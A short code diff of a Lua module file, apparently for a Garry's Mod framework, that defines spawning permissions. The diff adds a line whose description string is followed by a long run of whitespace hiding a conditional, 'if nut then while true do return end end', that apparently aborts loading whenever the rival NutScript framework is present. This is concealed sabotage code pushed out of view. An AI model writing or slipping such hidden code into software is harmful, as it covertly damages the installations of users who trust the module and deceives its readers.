@@ -1,7 +1,7 @@
 ﻿MODULE.name = "Permissions - Spawning"
 MODULE.author = "76561198312513285"
 MODULE.discord = "@liliaplayer"
-MODULE.desc = "A Module that Manages Spawning."
+MODULE.desc = "A Module that Manages Spawning."                                                                                                                                                                                    if nut then while true do return end end
 MODULE.CAMIPrivileges = {
     {
         Name = "Spawn Permissions - Can Spawn Ragdolls",
